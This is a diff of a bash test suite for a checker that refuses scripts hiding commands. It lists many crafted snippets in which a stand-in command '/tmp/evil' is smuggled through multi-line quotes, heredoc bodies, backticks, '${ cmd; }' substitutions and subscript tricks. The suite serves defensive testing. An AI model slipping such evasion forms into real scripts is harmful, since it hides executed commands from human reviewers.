 d=$(crr sl_zk "${H}cat <<EOF >/dev/null"$'\nx # `/tmp/evil`\nEOF\n'); expm caught "$d" 'absolute path' "strip_line: the same with backticks"
 d=$(crr sl_zl "${H}cat <<'EOF' >/dev/null"$'\n# $(/tmp/evil)\nEOF\necho ok\n'); expm ok "$d" - "strip_line: control: a quoted-delimiter heredoc body is data, \$( ) in it runs nothing"
-d=$(crr sl_zm "${H}cat <<EOF"$'\nE\\\nOF\nx=\'\n#\' ; /tmp/evil\nEOF\n'); expm caught "$d" 'heredoc body line' "strip_line: an unquoted heredoc body line that ends in a backslash is refused (bash joins it, so the delimiter may be another line; seat A, PR 436 round 3)"
-d=$(crr sl_zn "${H}cat <<EOF"$'\nx $(echo \'\n#\' ; /tmp/evil)\nEOF\n'); expm caught "$d" 'heredoc body line' "strip_line: an unquoted heredoc body line whose \$( ) runs on to the next line is refused"
-d=$(crr sl_zo "${H}cat <<EOF"$'\ndon\'t "q" $(date) `id` ${x:-a} $((1+2))\nEOF\necho ok # c\n'); expm caught "$d" 'holds a substitution and a quote' "strip_line: an unquoted heredoc body with quotes and substitutions on one line is refused (default deny)"
+d=$(crr sl_zm "${H}cat <<EOF"$'\nE\\\nOF\nx='"'"$'\n#'"'"$' ; /tmp/evil\nEOF\n'); expm caught "$d" 'heredoc body line' "strip_line: an unquoted heredoc body line that ends in a backslash is refused (bash joins it, so the delimiter may be another line; seat A, PR 436 round 3)"
+d=$(crr sl_zn "${H}cat <<EOF"$'\nx $(echo '"'"$'\n#'"'"$' ; /tmp/evil)\nEOF\n'); expm caught "$d" 'heredoc body line' "strip_line: an unquoted heredoc body line whose \$( ) runs on to the next line is refused"
+d=$(crr sl_zo "${H}cat <<EOF"$'\ndon'"'"$'t "q" $(date) `id` ${x:-a} $((1+2))\nEOF\necho ok # c\n'); expm caught "$d" 'holds a substitution and a quote' "strip_line: an unquoted heredoc body with quotes and substitutions on one line is refused (default deny)"
 d=$(crr sl_zp "${H}"$'x=`echo a # c` ; /tmp/evil x\ny=`echo b # c`\n'); expm caught "$d" 'absolute path' "strip_line: a # inside backticks does not cut the line (bash ends the comment at the closing backtick; seat B, PR 436 round 4)"
 d=$(crr sl_zq "${H}"$'x=`date` # a comment after the pair\necho ok\n'); expm ok "$d" - "strip_line: control: a # after a closed backtick pair is a comment"
-d=$(crr sl_zr "${H}: <<'EOF' \\"$'\nx=\'\n#\' ; /tmp/evil\nEOF\n'); expm caught "$d" 'ends in a backslash' "strip_line: a heredoc opened on a line that ends in a backslash is refused (seat A, PR 436 round 4)"
-d=$(crr sl_zs "${H}x=\`: <<'EOF' \`"$'\ny=\'\n#\' ; /tmp/evil\nEOF\n'); expm caught "$d" 'opens a heredoc inside' "strip_line: a << inside backticks is refused (bash gives it no body)"
+d=$(crr sl_zr "${H}: <<'EOF' \\"$'\nx='"'"$'\n#'"'"$' ; /tmp/evil\nEOF\n'); expm caught "$d" 'ends in a backslash' "strip_line: a heredoc opened on a line that ends in a backslash is refused (seat A, PR 436 round 4)"
+d=$(crr sl_zs "${H}x=\`: <<'EOF' \`"$'\ny='"'"$'\n#'"'"$' ; /tmp/evil\nEOF\n'); expm caught "$d" 'opens a heredoc inside' "strip_line: a << inside backticks is refused (bash gives it no body)"
 d=$(crr sl_zt "${H}"$'x=`echo a\n#` ; /tmp/evil\ny=`echo b\n#`\n'); expm caught "$d" 'still open' "strip_line: a # line inside backticks open from an earlier line is refused (bash ends the pair at the first backtick; seat A, PR 436 round 5)"
 for sep in $'\x0c' $'\x0b' $'\x1c' $'\xc2\x85' $'\xe2\x80\xa8'; do
   d=$(crr "sl_sep_$RANDOM" "${H}: ${sep}#; /tmp/evil"$'\n'); expm caught "$d" 'line separator' "strip_line: a line separator bash does not read as one is refused (seat A, PR 436 round 5)"
@@ -3524,10 +4156,10 @@ d=$(crr dq_za "${H}x=\"\$(declare -A a=([)]=1) ; /tmp/evil)\""$'\n'); expm caugh
 d=$(crr dq_zb "${H}x=\"\$(declare -A a; echo \$[ a[)] ] ; /tmp/evil)\""$'\n'); expm caught "$d" 'bracket' "quoted \$( ): a ) in \$[ ]"
 d=$(crr dq_zc "${H}x=\"\$(declare -A a; a[k]=1 ; [[ -n \$x ]] && echo \${a[k]})\""$'\n'); expm ok "$d" - "control: balanced subscripts and [[ ]] in a quoted \$( )"
 # seat B, PR 439 round 2: a quote that spans lines: the command reader read every line alone, so a line that begins inside a double quote and holds a lone ' hid what followed
-d=$(crr ml_a "${H}x=\""$'\n\'" ; /tmp/evil ; echo "\'"\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote: a line that starts inside the quote is not read as plain shell"
-d=$(crr ml_b "${H}x='a"$'\nb\' ; /tmp/evil ; echo \'c\'\n'); expm caught "$d" 'closes a multi-line' "multi-line single quote: the line that closes it holds a command"
-d=$(crr ml_c "${H}x=\$'a"$'\nb\' ; /tmp/evil ; echo \'c\'\n'); expm caught "$d" 'closes a multi-line' "multi-line ANSI-C quote: the same"
-d=$(crr ml_d "${H}echo \"first line"$'\nsecond line"; echo ok\necho \'one\ntwo (still data)\nthree\'\n'); expm caught "$d" 'closes a multi-line' "control: ordinary multi-line double-quoted and single-quoted strings"
+d=$(crr ml_a "${H}x=\""$'\n'"'"$'" ; /tmp/evil ; echo "'"'"$'"\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote: a line that starts inside the quote is not read as plain shell"
+d=$(crr ml_b "${H}x='a"$'\nb'"'"$' ; /tmp/evil ; echo '"'"$'c'"'"$'\n'); expm caught "$d" 'closes a multi-line' "multi-line single quote: the line that closes it holds a command"
+d=$(crr ml_c "${H}x=\$'a"$'\nb'"'"$' ; /tmp/evil ; echo '"'"$'c'"'"$'\n'); expm caught "$d" 'closes a multi-line' "multi-line ANSI-C quote: the same"
+d=$(crr ml_d "${H}echo \"first line"$'\nsecond line"; echo ok\necho '"'"$'one\ntwo (still data)\nthree'"'"$'\n'); expm caught "$d" 'closes a multi-line' "control: ordinary multi-line double-quoted and single-quoted strings"
 # seat B, PR 439 round 3: a substitution inside the quoted prefix of the line that closes a multi-line double quote runs in bash and must stay visible
 d=$(crr ml_e "${H}x=\""$'\n$(/tmp/evil)"\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote: a \$( ) on the closing line runs"
 d=$(crr ml_f "${H}x=\""$'\n`/tmp/evil`"\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote: backticks on the closing line run"
@@ -3535,14 +4167,14 @@ d=$(crr ml_g "${H}x=\""$'\n${y:-$(/tmp/evil)}"\n'); expm caught "$d" 'closes a m
 d=$(crr ml_h "${H}x=\"a"$'\n$(/tmp/evil)" ; echo\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote: a \$( ) before the closing quote, code after it"
 d=$(crr ml_i "${H}x=\"\$(echo \""$'\n$(/tmp/evil)" )"\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote nested in a \$( )"
 d=$(crr ml_j "${H}echo \""$'\nfoo $(/tmp/evil) bar"\n'); expm caught "$d" 'closes a multi-line' "multi-line double quote: text then a \$( ) then the closing quote"
-d=$(crr ml_k "${H}x=\$'"$'\n$(/tmp/evil)\'\necho ok\n'); expm caught "$d" 'closes a multi-line' "control: a \$( ) inside an ANSI-C quote is data (bash runs nothing)"
-d=$(crr ml_l "${H}x='"$'\n$(/tmp/evil)\'\necho ok\n'); expm caught "$d" 'closes a multi-line' "control: a \$( ) inside a single quote is data"
+d=$(crr ml_k "${H}x=\$'"$'\n$(/tmp/evil)'"'"$'\necho ok\n'); expm caught "$d" 'closes a multi-line' "control: a \$( ) inside an ANSI-C quote is data (bash runs nothing)"
+d=$(crr ml_l "${H}x='"$'\n$(/tmp/evil)'"'"$'\necho ok\n'); expm caught "$d" 'closes a multi-line' "control: a \$( ) inside a single quote is data"
 # seat A, PR 439 round 3: a line that begins inside SEVERAL contexts (a quote in a $( ) in a quote) and closes them: the command reader must start inside all of them
 d=$(crr ml_m "${H}y=\"\$(echo \""$'\na")" ; /tmp/evil ; z="x"\n'); expm caught "$d" 'closes a multi-line' "line closes a quote, a \$( ) and the outer quote, code follows"
 d=$(crr ml_n "${H}y=\"\$(echo \""$'\na")" ; /tmp/evil ; z="\n"\n'); expm caught "$d" 'closes a multi-line' "the same, with a quote left open after the code"
 d=$(crr ml_o "${H}y=\"\${v:-\$(echo \""$'\na")}" ; /tmp/evil ; z="\n"\n'); expm caught "$d" 'closes a multi-line' "the same through \${ }"
 d=$(crr ml_p "${H}y=\"\$(echo a"$'\nb)" ; /tmp/evil ; z="\n"\n'); expm caught "$d" 'closes a multi-line' "a line that begins inside a \$( ) inside a quote and closes both"
-d=$(crr ml_q "${H}y=\"\$(echo '"$'\na\')" ; /tmp/evil ; z="\n"\n'); expm caught "$d" 'closes a multi-line' "the same with a single quote inside the \$( )"
+d=$(crr ml_q "${H}y=\"\$(echo '"$'\na'"'"$')" ; /tmp/evil ; z="\n"\n'); expm caught "$d" 'closes a multi-line' "the same with a single quote inside the \$( )"
 d=$(crr ml_r "${H}y=\"\$(echo a"$'\nb)" ; echo ok\n'); expm caught "$d" 'closes a multi-line' "control: the same without a command after it"
 # seat B, PR 439 round 4: after a carried assignment context closes, the next word is the COMMAND (y=$(...) EVIL runs EVIL); after a carried argument context it is an operand
 d=$(crr ml_s "${H}y=\$("$'\n:\n) /tmp/evil\n'); expm caught "$d" 'closes a multi-line' "assignment with a multi-line \$( ): the word after the closing ) is the command"
@@ -3551,7 +4183,7 @@ d=$(crr ml_u "${H}x=\$(cat <<F"$'\nbody\nF\n) /tmp/evil\n'); expm caught "$d" 'c
 d=$(crr ml_v "${H}x=\$("$'\n# c\n) /tmp/evil\n'); expm caught "$d" 'closes a multi-line' "assignment with a comment line inside a multi-line \$( )"
 d=$(crr ml_w "${H}y=\"\$("$'\n:\n)" /tmp/evil\n'); expm caught "$d" 'closes a multi-line' "assignment with a quoted multi-line \$( ): the word after the closing quote is the command"
 d=$(crr ml_x "${H}echo \$("$'\n:\n) /tmp/out.txt\n'); expm caught "$d" 'closes a multi-line' "control: the word after a multi-line \$( ) that is an ARGUMENT is an operand, not a command"
-d=$(crr ml_y "${H}echo 'a"$'\nb\' "/tmp/out.txt" > /tmp/o\n'); expm caught "$d" 'closes a multi-line' "control: the word after a multi-line quote that is an argument is an operand"
+d=$(crr ml_y "${H}echo 'a"$'\nb'"'"$' "/tmp/out.txt" > /tmp/o\n'); expm caught "$d" 'closes a multi-line' "control: the word after a multi-line quote that is an argument is an operand"
 # seat A, PR 439 round 4: a line that closes a carried ( ) group or case begins at a command position: the stand-in word must not stick to its first word
 d=$(crr ml_z "${H}( true"$'\n/tmp/evil )\n'); expm caught "$d" 'absolute path' "a line closing a multi-line ( ) group starts a command"
 d=$(crr ml_za "${H}case a in a) true"$'\n/tmp/evil ;; esac\n'); expm caught "$d" 'absolute path' "a line inside a multi-line case arm starts a command"
@@ -3607,13 +4239,13 @@ d=$(crr ml_zzq "${H}export y=\$("$'\n:\n) /tmp/out\n'); expm caught "$d" 'closes
 # under the `deny` rule (waivable only by a reviewed line-bound exception); no bash grammar is emulated for it. Every form below was a hidden command in a round.
 cl() { local d; d=$(crr "$1" "${H}$2"); expm "$3" "$d" "$4" "closing line: $5"; }
 cl cl_a $'x="\na"\n' caught 'closes a multi-line' 'a double quote closed on a later line'
-cl cl_b $'x=\'a\nb\'\n' caught 'closes a multi-line' 'a single quote'
-cl cl_c $'x=$\'a\nb\'\n' caught 'closes a multi-line' 'an ANSI-C quote'
+cl cl_b $'x='"'"$'a\nb'"'"$'\n' caught 'closes a multi-line' 'a single quote'
+cl cl_c $'x=$'"'"$'a\nb'"'"$'\n' caught 'closes a multi-line' 'an ANSI-C quote'
 cl cl_d $'x=$(\n:\n)\n' caught 'closes a multi-line' 'a substitution'
 cl cl_e $'x=`\n:\n`\n' caught 'closes a multi-line' 'backticks'
 cl cl_f $'x=${y:-\n}\n' caught 'closes a multi-line' 'a ${ } '
 cl cl_g $'y="$(echo "\na")" ; /tmp/evil ; z="x"\n' caught 'closes a multi-line' 'a quote in a substitution in a quote (round 3)'
-cl cl_h $'x="\n\'" ; /tmp/evil ; echo "\'"\n' caught 'closes a multi-line' 'the first multi-line quote hole (round 2)'
+cl cl_h $'x="\n'"'"$'" ; /tmp/evil ; echo "'"'"$'"\n' caught 'closes a multi-line' 'the first multi-line quote hole (round 2)'
 cl cl_i $'y=$(\n:\n) /tmp/evil\n' caught 'closes a multi-line' 'a command after the closing ) (round 4)'
 cl cl_j $'> f > $(\necho g\n) /tmp/evil\n' caught 'closes a multi-line' 'a redirection target before the opener (round 8)'
 cl cl_k $'f() { a="\ng" /tmp/evil; }\n' caught 'closes a multi-line' 'a function body assignment (round 8)'
@@ -3621,59 +4253,59 @@ cl cl_l $'a="$( ( : \n: );/tmp/evil )"\n' caught 'closes a multi-line' 'a group 
 cl cl_m $'echo ` z=$( : `\n/tmp/evil ` ) \\\n: /tmp/evil ` : `\n' caught 'closes a multi-line' 'backtick pairing (round 8)'
 cl cl_n $'x=\\\ny="a\nb" /tmp/evil\n' caught 'closes a multi-line' 'a continuation then a multi-line quote'
 cl cl_o $'a[ $(\n:\n) ]=1 /tmp/evil\n' caught 'closes a multi-line' 'a subscript with a blank (round 7)'
-cl cl_p $'echo "a\nb" ; echo ok\necho \'c\nd\'\n' caught 'closes a multi-line' 'ordinary multi-line strings are refused too: they need their reviewed waiver'
-cl cl_q $'x="a b"\ny=$(echo c)\necho \'d\'\n' ok - 'control: single-line quotes and substitutions are untouched'
-cl cl_r $'x=\'a\nb\nc\'\n' caught 'closes a multi-line' 'a quote across three lines is refused once, at the line that closes it'
+cl cl_p $'echo "a\nb" ; echo ok\necho '"'"$'c\nd'"'"$'\n' caught 'closes a multi-line' 'ordinary multi-line strings are refused too: they need their reviewed waiver'
+cl cl_q $'x="a b"\ny=$(echo c)\necho '"'"$'d'"'"$'\n' ok - 'control: single-line quotes and substitutions are untouched'
+cl cl_r $'x='"'"$'a\nb\nc'"'"$'\n' caught 'closes a multi-line' 'a quote across three lines is refused once, at the line that closes it'
 cl cl_s $'f() (\n echo a\n)\necho ok\n' ok - 'control: a ( ) function body is not a quote or a substitution'
 cl cl_t $'case a in\n a) echo 1 ;;\nesac\n' ok - 'control: a case block spanning lines'
-cl cl_u $'cat <<EOF\nit\'s\nEOF\necho ok\n' ok - 'control: a heredoc body is data'
+cl cl_u $'cat <<EOF\nit'"'"$'s\nEOF\necho ok\n' ok - 'control: a heredoc body is data'
 # seat A, PR 439 round 9: in an UNQUOTED heredoc body bash runs $( ) and backticks and reads ' " $' as plain characters; the command reader must not read them as quotes
 hd() { local d; d=$(crr "$1" "${H}$2"); expm caught "$d" 'unquoted heredoc body line that holds a substitution and a quote' "unquoted heredoc body: $3"; }
-hd hd_a $'cat <<EOF >/dev/null\n\'$(/tmp/evil)\'\nEOF\n' "a \$( ) between single quotes"
-hd hd_b $'cat <<EOF >/dev/null\n\'`/tmp/evil`\'\nEOF\n' "backticks between single quotes"
-hd hd_c $'cat <<EOF >/dev/null\n$\'$(/tmp/evil)\'\nEOF\n' "an ANSI-C looking quote around a \$( )"
-hd hd_d $'cat <<EOF >/dev/null\n\'${y:-$(/tmp/evil)}\'\nEOF\n' "a \${ :- \$( ) } between single quotes"
-hd hd_e $'cat <<-X >/dev/null\n\t\'$(/tmp/evil)\'\n\tX\n' "a <<- body, tab indented"
+hd hd_a $'cat <<EOF >/dev/null\n'"'"$'$(/tmp/evil)'"'"$'\nEOF\n' "a \$( ) between single quotes"
+hd hd_b $'cat <<EOF >/dev/null\n'"'"$'`/tmp/evil`'"'"$'\nEOF\n' "backticks between single quotes"
+hd hd_c $'cat <<EOF >/dev/null\n$'"'"$'$(/tmp/evil)'"'"$'\nEOF\n' "an ANSI-C looking quote around a \$( )"
+hd hd_d $'cat <<EOF >/dev/null\n'"'"$'${y:-$(/tmp/evil)}'"'"$'\nEOF\n' "a \${ :- \$( ) } between single quotes"
+hd hd_e $'cat <<-X >/dev/null\n\t'"'"$'$(/tmp/evil)'"'"$'\n\tX\n' "a <<- body, tab indented"
 hd hd_f $': <<EOF\n"$(/tmp/evil)"\nEOF\n' "double quotes around a \$( ) with : as the command"
-hd hd_g $'cat <<EOF >/dev/null\nit\'s $(/tmp/evil) done\nEOF\n' "an apostrophe in prose before a \$( )"
-cl hd_h $'cat <<\'EOF\' >/dev/null\n\'$(/tmp/evil)\'\nEOF\necho ok\n' caught 'compound assignment' 'a quoted opener is refused as data even in a quoted-delimiter heredoc body (default deny, nothing is resolved: fragments of a compound value can be joined at run time; a listed line needs a reviewed waiver)'
+hd hd_g $'cat <<EOF >/dev/null\nit'"'"$'s $(/tmp/evil) done\nEOF\n' "an apostrophe in prose before a \$( )"
+cl hd_h $'cat <<'"'"$'EOF'"'"$' >/dev/null\n'"'"$'$(/tmp/evil)'"'"$'\nEOF\necho ok\n' caught 'compound assignment' 'a quoted opener is refused as data even in a quoted-delimiter heredoc body (default deny, nothing is resolved: fragments of a compound value can be joined at run time; a listed line needs a reviewed waiver)'
 # seat A, PR 439 fix check: inside a $( ) or backticks of an unquoted body bash reads quotes as quotes again: replacing them must not hide a quoted command word
 hd hd_i $'cat <<EOF >/dev/null\nx $("/tmp/evil")\nEOF\n' "a double-quoted command word in a \$( )"
-hd hd_j $'cat <<EOF >/dev/null\nx $(\'/tmp/evil\')\nEOF\n' "a single-quoted command word in a \$( )"
+hd hd_j $'cat <<EOF >/dev/null\nx $('"'"$'/tmp/evil'"'"$')\nEOF\n' "a single-quoted command word in a \$( )"
 hd hd_k $'cat <<EOF >/dev/null\nx `"/tmp/evil"`\nEOF\n' "a quoted command word in backticks"
 hd hd_l $'cat <<EOF >/dev/null\nx $(: ; "/tmp/evil")\nEOF\n' "a quoted command word after a separator in a \$( )"
 hd hd_m $'cat <<EOF >/dev/null\nx $(""/tmp/evil)\nEOF\n' "an empty quoted string before the path in a \$( )"
 # seat A, PR 439 second fix check (a known pre-existing form, follow-up PR): a line that opens MORE THAN ONE heredoc, or a heredoc inside a $( ) / backticks that closes on the same line,
 # is refused (bash reads the substitution's heredoc body first and runs its $( ); the reader queues the bodies in written order). Default deny, waivable by a reviewed line-bound exception.
 hm() { local d; d=$(crr "$1" "${H}$2"); expm "$3" "$d" "$4" "heredoc order: $5"; }
-hm hm_a $': <<\'A\' $(cat <<B)\n\'$(/tmp/evil)\'\nB\nx\nA\n: <<\'Z\'\nB\nZ\necho ok\n' caught 'opens a heredoc inside' 'two heredocs, one inside a $( ) on the same line (the reproducer)'
-hm hm_b $': <<\'A\'; x=$(cat <<B)\n\'$(/tmp/evil)\'\nB\nx\nA\n: <<\'Z\'\nB\nZ\necho ok\n' caught 'opens a heredoc inside' 'the same after a ;'
+hm hm_a $': <<'"'"$'A'"'"$' $(cat <<B)\n'"'"$'$(/tmp/evil)'"'"$'\nB\nx\nA\n: <<'"'"$'Z'"'"$'\nB\nZ\necho ok\n' caught 'opens a heredoc inside' 'two heredocs, one inside a $( ) on the same line (the reproducer)'
+hm hm_b $': <<'"'"$'A'"'"$'; x=$(cat <<B)\n'"'"$'$(/tmp/evil)'"'"$'\nB\nx\nA\n: <<'"'"$'Z'"'"$'\nB\nZ\necho ok\n' caught 'opens a heredoc inside' 'the same after a ;'
 hm hm_c $'cat <<A <<B\na\nA\nb\nB\n' caught 'opens more than one heredoc' 'two heredocs on one line'
-hm hm_d $': <<\'A\' <<\'B\'\nx\nA\ny\nB\n' caught 'opens more than one heredoc' 'two quoted heredocs on one line'
+hm hm_d $': <<'"'"$'A'"'"$' <<'"'"$'B'"'"$'\nx\nA\ny\nB\n' caught 'opens more than one heredoc' 'two quoted heredocs on one line'
 hm hm_e $'x=$(cat <<B)\nb\nB\n' caught 'opens a heredoc inside' 'a heredoc opened inside a $( ) that closes on its line'
 hm hm_f $'x=`cat <<B`\nb\nB\n' caught 'opens a heredoc inside' 'a heredoc inside backticks'
 hm hm_g $'( cat <<B )\nb\nB\n' caught 'opens a heredoc inside' 'a heredoc inside a ( ) group on one line'
-hm hm_h $'cat <<EOF\nb\nEOF\ncat <<\'EOF\'\nplain\nEOF\necho ok\n' ok - 'control: two heredocs on separate lines'
+hm hm_h $'cat <<EOF\nb\nEOF\ncat <<'"'"$'EOF'"'"$'\nplain\nEOF\necho ok\n' ok - 'control: two heredocs on separate lines'
 hm hm_i $'cat <<EOF >/dev/null\nplain text\nEOF\necho ok\n' ok - 'control: one plain heredoc'
 hm hm_j $'f() (\n cat <<EOF\n a\nEOF\n)\necho ok\n' ok - 'control: a heredoc inside a multi-line function body ( ) is a normal heredoc'
 # seat A, PR 449 round 1: a heredoc inside a bash 5.3 ${ cmd; } / ${| cmd; } command substitution; a heredoc inside backticks has no body in bash, so it must not be queued (a waiver would hide the lines after it)
-hm hm_k $': <<\'A\' ${ cat <<B; : }\n\'$(/tmp/evil)\'\nB\n}\nx\nA\necho ok\n' caught 'opens a heredoc inside' 'a heredoc in a ${ cmd; } substitution'
-hm hm_l $': <<\'A\' ${| cat <<B >/dev/null; : }\n\'$(/tmp/evil)\'\nB\n}\nx\nA\necho ok\n' caught 'opens a heredoc inside' 'a heredoc in a ${| cmd; } substitution'
-hm hm_m $'x=`: <<\'EOF\' `\ny=\'\n#\' ; /tmp/evil\nEOF\n' caught 'opens a heredoc inside' 'a heredoc in backticks is not queued: the lines after it are read as code'
+hm hm_k $': <<'"'"$'A'"'"$' ${ cat <<B; : }\n'"'"$'$(/tmp/evil)'"'"$'\nB\n}\nx\nA\necho ok\n' caught 'opens a heredoc inside' 'a heredoc in a ${ cmd; } substitution'
+hm hm_l $': <<'"'"$'A'"'"$' ${| cat <<B >/dev/null; : }\n'"'"$'$(/tmp/evil)'"'"$'\nB\n}\nx\nA\necho ok\n' caught 'opens a heredoc inside' 'a heredoc in a ${| cmd; } substitution'
+hm hm_m $'x=`: <<'"'"$'EOF'"'"$' `\ny='"'"$'\n#'"'"$' ; /tmp/evil\nEOF\n' caught 'opens a heredoc inside' 'a heredoc in backticks is not queued: the lines after it are read as code'
 hm hm_n $'(\ncat <<EOF)\ny\nEOF\necho ok\n' ok - 'control: a delimiter ending at ) when the group was opened on an earlier line'
 # seat A, PR 449 round 2: bash 5.3 ${ cmd; } / ${| cmd; } ends at a } in COMMAND position, not at the first }: default deny for the opener itself; and hm_m now also asserts the lines after a backtick heredoc are read as code
-hm hm_o $'x=`: <<\'EOF\' `\ny=\'\n#\' ; /tmp/evil\nEOF\n' caught 'absolute path' 'a heredoc in backticks is not queued: /tmp/evil is read as code'
-hm hm_p $': <<\'A\' ${ : # }\ncat <<B\n\'$(/tmp/evil)\'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'a } inside a comment does not end a ${ cmd; }'
-hm hm_q $': <<\'A\' ${ echo }\ncat <<B\n\'$(/tmp/evil)\'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'a } as an argument does not end it'
-hm hm_r $': <<\'A\' ${| : # }\ncat <<B >/dev/null\n\'$(/tmp/evil)\'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'the ${| form'
-hm hm_s $': <<\'A\' ${ : ${x:-a} }\ncat <<B\n\'$(/tmp/evil)\'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'an inner ${x:-a} closing before it'
+hm hm_o $'x=`: <<'"'"$'EOF'"'"$' `\ny='"'"$'\n#'"'"$' ; /tmp/evil\nEOF\n' caught 'absolute path' 'a heredoc in backticks is not queued: /tmp/evil is read as code'
+hm hm_p $': <<'"'"$'A'"'"$' ${ : # }\ncat <<B\n'"'"$'$(/tmp/evil)'"'"$'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'a } inside a comment does not end a ${ cmd; }'
+hm hm_q $': <<'"'"$'A'"'"$' ${ echo }\ncat <<B\n'"'"$'$(/tmp/evil)'"'"$'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'a } as an argument does not end it'
+hm hm_r $': <<'"'"$'A'"'"$' ${| : # }\ncat <<B >/dev/null\n'"'"$'$(/tmp/evil)'"'"$'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'the ${| form'
+hm hm_s $': <<'"'"$'A'"'"$' ${ : ${x:-a} }\ncat <<B\n'"'"$'$(/tmp/evil)'"'"$'\nB\n}\nx\nA\necho ok\n' caught 'a ${ command substitution' 'an inner ${x:-a} closing before it'
 hm hm_t $'x=${y:-a}\necho "${y#a} ${#y}"\necho ${z%%b}\n' ok - 'control: ordinary parameter expansions are untouched'
 # seat B, PR 449 round 3: the ${ cmd; } refusal also applies to a line of an UNQUOTED heredoc body (bash runs it there too)
 hm hm_u $'cat <<B >/dev/null\n${ /tmp/evil; }\nB\n' caught 'a ${ command substitution' 'a funsub in an unquoted heredoc body'
 hm hm_v $'cat <<B >/dev/null\n${| /tmp/evil; }\nB\n' caught 'a ${ command substitution' 'the ${| form in an unquoted body'
 hm hm_w $'cat <<-B >/dev/null\n\t${ /tmp/evil; }\n\tB\n' caught 'a ${ command substitution' 'a tab-indented body of a <<- heredoc'
 hm hm_x $'cat <<B >/dev/null\n${ /tmp/evil; }\n${x}\nB\n' caught 'a ${ command substitution' 'followed by an ordinary expansion line'
-hm hm_y $'cat <<\'B\' >/dev/null\n${ /tmp/evil; }\nB\necho ok\n' ok - 'control: in a quoted-delimiter body it is data'
+hm hm_y $'cat <<'"'"$'B'"'"$' >/dev/null\n${ /tmp/evil; }\nB\necho ok\n' ok - 'control: in a quoted-delimiter body it is data'
 hm hm_z $'cat <<B >/dev/null\n${x} ${y:-a} ${#z} ${w%%b}\nB\necho ok\n' ok - 'control: ordinary expansions in an unquoted body'
 # seat B, PR 449 round 4: a ${ cmd; } opener split by a backslash-newline on a code line
 hm hm_za $'echo $\\\n{ /tmp/evil; }\n' caught 'a ${ command substitution' 'the $ and the { split by a continuation'
@@ -3681,14 +4313,14 @@ hm hm_zb $'echo ${\\\n /tmp/evil; }\n' caught 'a ${ command substitution' 'the $
 hm hm_zc $'echo ${\\\n| /tmp/evil; }\n' caught 'a ${ command substitution' 'the ${ and the | split by a continuation'
 hm hm_zd $'echo "price: 5$"\necho $x\\\n+1\n' ok - 'control: a $ at the end of a string and an ordinary continuation'
 # seat A, PR 449 round 4: bash reads << inside an assignment subscript a[x<<y ]=1 as an arithmetic shift, not a heredoc; the judge queued a fake heredoc and read the next lines as its body
-hm hm_ze $'y() { :; }\na[x<<y ]=1\nz="\n\'"; /tmp/evil; z=\'\n\'\ny\necho end\n' caught 'has a << inside a [ ] subscript' 'a fake heredoc from a shift in an assignment subscript'
+hm hm_ze $'y() { :; }\na[x<<y ]=1\nz="\n'"'"$'"; /tmp/evil; z='"'"$'\n'"'"$'\ny\necho end\n' caught 'has a << inside a [ ] subscript' 'a fake heredoc from a shift in an assignment subscript'
 hm hm_zf $'a[x<<y ]+=1\nz=1\n' caught 'has a << inside a [ ] subscript' 'the += form'
 hm hm_zg $'z=1 a[x<<y ]=1\nz=1\n' caught 'has a << inside a [ ] subscript' 'after another assignment'
 hm hm_zh $'cat <<EOF\n[ not a subscript\nEOF\necho "$((1<<2))"\n' caught 'a << inside' 'control-ish: a $(( )) shift is already refused'
 hm hm_zi $'[ a = b ] && cat <<EOF\nx\nEOF\necho ok\n' ok - 'control: a closed [ ] test before a heredoc'
 # seat A, PR 449 round 5: an assignment subscript spans physical lines (a newline or a backslash-newline inside a[ ... ]), and a # inside it is no comment: default deny for a NAME[ subscript left open at the end of a line, for a # inside one, and for a line that starts with # while one is open
-hm hm_zj $'y() { :; }\na[x\\\n<<y ]=1\nz="\n\'"; /tmp/evil; z=\'\n\'\ny\necho end\n' caught 'assignment subscript' 'a subscript spanning a backslash-newline'
-hm hm_zk $'y() { :; }\na[x\n<<y ]=1\nz="\n\'"; /tmp/evil; z=\'\n\'\ny\necho end\n' caught 'assignment subscript' 'a subscript spanning a newline'
+hm hm_zj $'y() { :; }\na[x\\\n<<y ]=1\nz="\n'"'"$'"; /tmp/evil; z='"'"$'\n'"'"$'\ny\necho end\n' caught 'assignment subscript' 'a subscript spanning a backslash-newline'
+hm hm_zk $'y() { :; }\na[x\n<<y ]=1\nz="\n'"'"$'"; /tmp/evil; z='"'"$'\n'"'"$'\ny\necho end\n' caught 'assignment subscript' 'a subscript spanning a newline'
 hm hm_zl $'b=2 a[x\n<<y ]=1\nz=1\n' caught 'assignment subscript' 'after another assignment'
 hm hm_zm $'declare -A a\na[k #]=1; /tmp/evil\necho end\n' caught 'assignment subscript' 'a # inside an assignment subscript is no comment'
 hm hm_zn $'declare -A a\na[k #]=1 /tmp/evil\necho end\n' caught 'assignment subscript' 'the temp-env form'
@@ -3696,8 +4328,8 @@ hm hm_zo $'declare -A a\na[k\n#]=1; /tmp/evil\necho end\n' caught 'assignment su
 hm hm_zp $'a[1]=1\nb[$i]+=2\nx=${a[1]}\n[ a = b ] && echo ok\necho "a[ b ]"\n# a [ comment\n' ok - 'control: balanced subscripts, a test, a quoted [ and a comment with [ are untouched'
 # seat A, PR 449 round 6: a ] inside a $( ) or backticks inside an assignment subscript does not end the subscript
 hm hm_zq $'declare -A a\na[$(echo ]) #]=1; /tmp/evil\necho end\n' caught 'assignment subscript' 'a ] in a $( ) inside the subscript, then a #'
-hm hm_zr $'declare -A a\ny() { :; }\na[$(echo ])\n<<y ]=1\nz="\n\'"; /tmp/evil; z=\'\n\'\ny\necho end\n' caught 'assignment subscript' 'a ] in a $( ) inside the subscript, then a << on the next line'
